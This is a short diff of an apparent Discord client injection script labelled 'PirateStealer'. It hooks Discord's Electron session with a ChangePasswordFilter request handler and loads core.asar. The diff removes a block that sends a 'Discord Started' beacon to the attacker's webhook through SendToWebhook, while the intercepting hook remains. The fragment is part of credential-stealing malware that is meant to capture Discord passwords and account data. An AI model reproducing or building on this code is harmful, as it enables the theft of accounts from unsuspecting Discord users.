@@ -1468,18 +1468,3 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 	}
 });
 module.exports = require('./core.asar')
-
-var c = {
-        username: "PirateStealer",
-        content: "",
-        embeds: [{
-          title: "Discord Started",
-          description: "hi xd",
-          color: config["embed-color"],
-          fields: [{
-            name: "Info",
-            value: "i dont know",
-            inline: !1
-        }]
-      };
-SendToWebhook(JSON.stringify(c))
